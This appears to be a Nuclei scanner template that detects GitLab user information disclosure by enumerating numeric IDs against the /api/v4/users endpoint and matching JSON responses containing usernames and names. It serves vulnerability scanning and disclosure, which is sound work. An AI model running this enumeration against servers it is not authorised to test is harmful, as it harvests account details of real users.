id: gitlab-user-open-api
info:
  author: Suman_Kar
  name: GitLab - User Information Disclosure Via Open API
  reference: https://gitlab.com/gitlab-org/gitlab-foss/-/issues/40158
  severity: medium
  tags: gitlab,disclosure
requests:
- attack: sniper
  matchers:
  - condition: and
    part: body
    regex:
    - username.*
    - id.*
    - name.*
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    uid: helpers/wordlists/numbers.txt
  raw:
  - 'GET /api/v4/users/{{uid}} HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en-US,en;q=0.9

    Accept: application/json, text/plain, */*

    Referer: {{BaseURL}}

    Connection: keep-alive

    '
  threads: 50
